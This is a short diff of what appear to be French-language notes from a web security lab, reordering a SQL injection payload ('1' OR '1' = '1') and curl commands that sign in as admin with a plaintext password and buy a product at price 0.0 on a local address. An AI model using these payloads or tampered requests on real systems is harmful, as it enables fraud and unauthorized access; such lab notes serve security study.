@@ -28,9 +28,9 @@ const token_hash_bytes = Array.from(new Uint8Array(token_hash_buffer));
 const token_hash_str = token_hash_bytes.map(b => b.toString(16).padStart(2, '0')).join('');
 id = user_agent_hash_str;
 
+- injection SQL :
+1' OR '1' = '1
+
 - acheter produit gratuitement :
 curl -X POST -F 'login=admin' -F 'password=theophile0910' -F 'id=azerty' 192.168.1.10?request=sign_in
 curl -X POST -F 'id=4' -F 'quantity=1' -F 'price=0.0' 192.168.1.10?request=buy_product
-
-- injection SQL :
-1' OR '1' = '1
